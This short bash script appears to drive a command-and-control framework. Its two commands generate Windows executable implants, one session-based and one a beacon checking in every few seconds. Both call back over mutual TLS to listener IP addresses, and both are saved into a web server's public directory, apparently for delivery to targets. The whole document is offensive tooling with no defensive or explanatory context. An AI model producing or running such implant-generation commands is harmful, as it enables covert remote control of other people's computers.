#!/bin/bash

# create implant sessions
generate --mtls 192.168.216.14 --os windows --arch amd64 --format exe --save /var/www/html/sessions
beacon --mtls 192.168.122.14:8080 --os windows --arch amd64 --format exe --save /var/www/html/beacons --seconds 5 --jitter 3